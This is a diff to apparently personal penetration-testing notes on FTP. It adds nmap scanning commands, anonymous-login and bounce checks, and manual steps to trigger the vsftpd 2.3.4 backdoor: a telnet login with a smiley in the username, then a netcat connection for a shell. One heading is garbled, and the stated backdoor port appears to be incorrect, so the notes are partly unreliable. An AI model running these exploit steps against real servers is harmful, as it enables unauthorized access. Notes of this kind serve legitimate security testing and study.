@@ -4,14 +4,20 @@ description: TCP/21
 
 # FTP
 
-### nmap scripts
+### Enumerating with nmap
+
+```bash
+nmap -v -n -Pn -sT -p 21 --open --oA report_ftp $range
+grep open report_ftp.gnmap | cut -d" " -f2 > hosts_ftp.txt
+```
+
+## Enumeration with NSEnmap scansnmap scripts
 
 ```bash
 #check for anonymous
 nmap -v -p 21 --script=ftp-anon.nse $ip-254
 
 nmap -sT -p 21 -v -n -Pn --script ftp-bounce $ip
-
 ```
 
 ### VSFTPD
@@ -19,7 +25,11 @@ nmap -sT -p 21 -v -n -Pn --script ftp-bounce $ip
 version 2.3.4 is vulnerable
 
 ```bash
-msf> exploit/unix/ftp/vsftp_234_backdoor
-set payload cmd/unix/interact exploit
+telnet $ip 21
+USER someone: )
+PASS nothing
+ctrl+[
+
+nc $ip 6900
 ```
 
